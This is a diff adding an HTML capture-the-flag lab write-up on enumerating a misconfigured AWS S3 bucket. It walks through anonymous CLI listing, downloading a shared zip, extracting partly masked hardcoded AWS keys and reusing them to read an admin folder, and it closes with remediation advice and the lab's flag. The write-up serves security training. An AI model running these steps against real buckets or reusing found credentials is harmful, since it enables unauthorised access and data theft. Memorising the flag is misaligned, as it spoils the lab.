@@ -1,0 +1,262 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>AWS S3 Enumeration Basics — Lab</title>
+  <style>
+    :root{
+      --bg:#0f1724; --card:#0b1220; --muted:#94a3b8; --accent:#7dd3fc;
+      --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Courier New", monospace;
+      color-scheme: dark;
+    }
+    body{font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:linear-gradient(180deg,#071024, #071022 300px); color:#e6eef8; margin:0; padding:24px;}
+    .container{max-width:1000px; margin:0 auto;}
+    header{display:flex;gap:16px;align-items:center;margin-bottom:18px}
+    header h1{font-size:20px;margin:0}
+    header p{margin:0;color:var(--muted);font-size:13px}
+    .card{background:var(--card); border:1px solid rgba(255,255,255,0.03); border-radius:12px; padding:18px; margin-bottom:16px; box-shadow:0 6px 18px rgba(2,6,23,0.6)}
+    h2{margin-top:0;color:var(--accent)}
+    p{line-height:1.5;color:#d7e7f5}
+    ul{color:var(--muted);line-height:1.6}
+    pre{background:#071322;color:#d9f0ff;padding:12px;border-radius:8px;overflow:auto;font-family:var(--mono);font-size:13px}
+    code{font-family:var(--mono);background:rgba(255,255,255,0.02);padding:2px 6px;border-radius:4px}
+    .meta{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:12px}
+    .pill{background:rgba(255,255,255,0.02);padding:6px 10px;border-radius:999px;color:var(--muted);font-size:13px}
+    .flag{font-family:var(--mono);background:#052032;padding:10px;border-left:4px solid #ff7b72;border-radius:6px;display:inline-block;color:#fff}
+    a{color:var(--accent)}
+    table{width:100%;border-collapse:collapse;margin:12px 0}
+    th,td{padding:8px;border-bottom:1px dashed rgba(255,255,255,0.03);text-align:left;color:var(--muted);font-size:14px}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div>
+        <h1>AWS S3 Enumeration Basics</h1>
+        <p>Lab — aws s3CTF · Entry point: <a href="http://dev.huge-logistics.com" target="_blank" rel="noopener">dev.huge-logistics.com</a></p>
+      </div>
+      <div style="margin-left:auto;text-align:right">
+        <p style="margin:0;color:var(--muted)">Time remaining</p>
+        <p style="margin:0;font-weight:600;color:#fff">04 hours, 55 minutes, 13 seconds</p>
+      </div>
+    </header>
+
+    <section class="card">
+      <h2>Overview</h2>
+      <p>Format for flags: <strong>MD5 hash</strong> (unless specified otherwise). This lab is also suitable for a CTF approach.</p>
+
+      <h3>Scenario</h3>
+      <p>It's your first day on the red team, and you've been tasked with examining a website that was found in a phished employee's bookmarks. Check it out and see where it leads! In scope is the company's infrastructure, including cloud services.</p>
+
+      <div class="meta">
+        <span class="pill">Difficulty: Beginner</span>
+        <span class="pill">Focus: Red</span>
+      </div>
+    </section>
+
+    <section class="card">
+      <h2>Lab prerequisites</h2>
+      <ul>
+        <li>Basic Linux command line knowledge</li>
+      </ul>
+
+      <h2>Learning outcomes</h2>
+      <ul>
+        <li>Familiarity with the AWS CLI</li>
+        <li>Basic S3 enumeration and credential exfiltration</li>
+        <li>An awareness of how this scenario could have been prevented</li>
+      </ul>
+    </section>
+
+    <section class="card">
+      <h2>Real-world context</h2>
+      <p>Amazon S3 (Simple Storage Service) is a popular AWS service used to store files, backups and can even be used to serve websites. Misconfigurations and overly permissive S3 settings have caused many breaches — e.g. making buckets world-readable or storing sensitive files alongside public website content.</p>
+    </section>
+
+    <section class="card">
+      <h2>Walkthrough</h2>
+
+      <h3>Initial reconnaissance</h3>
+      <p>Start by viewing the site and its source. You'll often find an S3 bucket used for static files (images, CSS, JS) — in this lab it's <code>dev.huge-logistics.com</code>.</p>
+
+      <h3>Browser attempts</h3>
+      <p>Examples (not successful here):</p>
+      <pre><code>https://s3.amazonaws.com/dev.huge-logistics.com/static/style.css
+https://s3.amazonaws.com/dev.huge-logistics.com/static/
+https://s3.amazonaws.com/dev.huge-logistics.com/</code></pre>
+
+      <p>Both of the directory requests above returned access denied in the browser.</p>
+
+      <h3>Use the AWS CLI</h3>
+      <p>Install on Debian/Ubuntu:</p>
+      <pre><code>apt install awscli</code></pre>
+
+      <p>Try listing the bucket anonymously (unsigned):</p>
+      <pre><code>aws s3 ls s3://dev.huge-logistics.com --no-sign-request</code></pre>
+
+      <p><strong>Note:</strong> the AWS CLI v2 signs requests by default; <code>--no-sign-request</code> forces an unsigned (anonymous) request.</p>
+
+      <h3>What the CLI revealed</h3>
+      <p>The bucket was open to public listing via the CLI, showing directories including <code>shared/</code>, <code>static/</code>, <code>admin/</code> and <code>migration-files/</code>. Recursive listing failed (access denied).</p>
+
+      <pre><code>aws s3 ls s3://dev.huge-logistics.com --no-sign-request --recursive
+aws s3 ls s3://dev.huge-logistics.com/admin --no-sign-request
+aws s3 ls s3://dev.huge-logistics.com/migration-files/ --no-sign-request
+aws s3 ls s3://dev.huge-logistics.com/static/ --no-sign-request
+aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request</code></pre>
+
+      <p>The <code>shared/</code> directory contained <code>hl_migration_project.zip</code>. Download it:</p>
+      <pre><code>aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
+unzip hl_migration_project.zip</code></pre>
+
+      <p>Inside was a PowerShell migration script containing hardcoded AWS keys and the region <code>us-east-1</code> (useful to know when configuring AWS credentials).</p>
+
+      <h3>PowerShell snippet (from the leaked script)</h3>
+      <pre><code># AWS Configuration
+$accessKey = "A**************U"
+$secretKey = "MwG******************RX/gb9"
+$region = "us-east-1"
+
+# Set up AWS hardcoded credentials
+Set-AWSCredentials -AccessKey $accessKey -SecretKey $secretKey
+
+# Set the AWS region
+Set-DefaultAWSRegion -Region $region
+
+# Read the secrets from export.xml
+[xml]$xmlContent = Get-Content -Path "export.xml"
+
+# Output log file
+$logFile = "upload_log.txt"
+
+# Error handling with retry logic
+function TryUploadSecret($secretName, $secretValue) {
+    $retries = 3
+    while ($retries -gt 0) {
+        try {
+            $result = New-SECSecret -Name $secretName -SecretString $secretValue
+            $logEntry = "Successfully uploaded secret: $secretName with ARN: $($result.ARN)"
+            Write-Output $logEntry
+            Add-Content -Path $logFile -Value $logEntry
+            return $true
+        } catch {
+            $retries--
+            Write-Error "Failed attempt to upload secret: $secretName. Retries left: $retries. Error: $_"
+        }
+    }
+    return $false
+}
+
+foreach ($secretNode in $xmlContent.Secrets.Secret) {
+    Start-Job -ScriptBlock {
+        param($secretName, $secretValue)
+        TryUploadSecret -secretName $secretName -secretValue $secretValue
+    } -ArgumentList $secretNode.Name, $secretNode.Value
+}
+
+# Wait for all jobs to finish
+$jobs = Get-Job
+$jobs | Wait-Job
+
+# Retrieve and display job results
+$jobs | ForEach-Object {
+    $result = Receive-Job -Job $_
+    if (-not $result) {
+        Write-Error "Failed to upload secret: $($_.Name) after multiple retries."
+    }
+    Remove-Job -Job $_
+}
+
+Write-Output "Batch upload complete!"</code></pre>
+
+      <h3>Leaked test-export.xml</h3>
+      <p>From <code>migration-files/test-export.xml</code>, you may find sensitive credentials (example snippet):</p>
+      <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;CredentialsExport&gt;
+  &lt;CredentialEntry&gt;
+    &lt;ServiceType&gt;AWS IT Admin&lt;/ServiceType&gt;
+    &lt;AccountID&gt;794929857501&lt;/AccountID&gt;
+    &lt;AccessKeyID&gt;AKI*********GCD&lt;/AccessKeyID&gt;
+    &lt;SecretAccessKey&gt;t21ERPmD**********0bnL4hY6jP&lt;/SecretAccessKey&gt;
+    &lt;Notes&gt;A production AWS credential entry.&lt;/Notes&gt;
+  &lt;/CredentialEntry&gt;
+  ...
+&lt;/CredentialsExport&gt;</code></pre>
+
+      <h3>Using the discovered keys</h3>
+      <p>Configure AWS CLI with the leaked key pair:</p>
+      <pre><code>aws configure
+# then check identity:
+aws sts get-caller-identity</code></pre>
+
+      <p>When using the leaked <code>it-admin</code> credentials, the admin folder becomes listable. You might find:</p>
+      <pre><code>aws s3 ls s3://dev.huge-logistics.com/admin/
+aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv -
+</code></pre>
+
+      <h3>Why did CLI anonymous list work while the browser failed?</h3>
+      <p>The bucket policy allowed <code>s3:ListBucket</code> only when requests included specific parameters (<code>prefix</code> and <code>delimiter</code>). The AWS CLI includes these parameters by default; browsers usually do not. Example policy statement:</p>
+      <pre><code>{
+  "Sid": "ListBucketRootAndShared",
+  "Effect": "Allow",
+  "Principal": "*",
+  "Action": "s3:ListBucket",
+  "Resource": "arn:aws:s3:::dev.huge-logistics.com",
+  "Condition": {
+    "StringEquals": {
+      "s3:prefix": [
+        "",
+        "shared/",
+        "static/"
+      ],
+      "s3:delimiter": "/"
+    }
+  }
+}</code></pre>
+
+      <p>To list the root in a browser (include parameters):</p>
+      <pre><code>https://dev.huge-logistics.com.s3.amazonaws.com/?prefix=&delimiter=/</code></pre>
+    </section>
+
+    <section class="card">
+      <h2>Attack path visualization</h2>
+      <p>(Visualizations would normally go here — map discovery → download → privilege escalation → data exfiltration.)</p>
+
+      <h2>Defense & remediation</h2>
+      <ul>
+        <li>Do not mix public website content and sensitive files in a single S3 bucket — separate buckets for public vs sensitive data.</li>
+        <li>Never hardcode AWS credentials in scripts. Use IAM roles, environment variables, or a secure secrets manager and enforce rotation.</li>
+        <li>Limit bucket policies and enforce least privilege; use encryption and restrict public read/list where not needed.</li>
+        <li>When sharing files with external parties, prefer secured, time-limited mechanisms (pre-signed URLs, encrypted archives, or secure transfer tools).</li>
+      </ul>
+    </section>
+
+    <section class="card">
+      <h2>Flag</h2>
+      <p>Submit the MD5 flag:</p>
+      <div class="flag">a49f18145568e4d001414ef1415086b8</div>
+    </section>
+
+    <section class="card">
+      <h2>Further reading</h2>
+      <ul>
+        <li><a href="https://github.com/nagwww/s3-leaks" target="_blank" rel="noopener">s3-leaks (GitHub)</a></li>
+        <li><a href="https://blog.gitguardian.com/uber-breach-2022/" target="_blank" rel="noopener">GitGuardian: Uber breach 2022 analysis</a></li>
+      </ul>
+
+      <h2>Related labs</h2>
+      <ul>
+        <li>Abuse OpenID Connect and GitLab for AWS Access</li>
+        <li>Escalate Privileges by IAM Policy Rollback</li>
+        <li>Breach in the Cloud</li>
+        <li>Hunt for Secrets in Git Repos</li>
+      </ul>
+    </section>
+
+    <footer style="text-align:center;color:var(--muted);font-size:13px;margin-top:14px">
+      &copy; AWS S3 Enumeration Lab — created for learning purposes.
+    </footer>
+  </div>
+</body>
+</html>
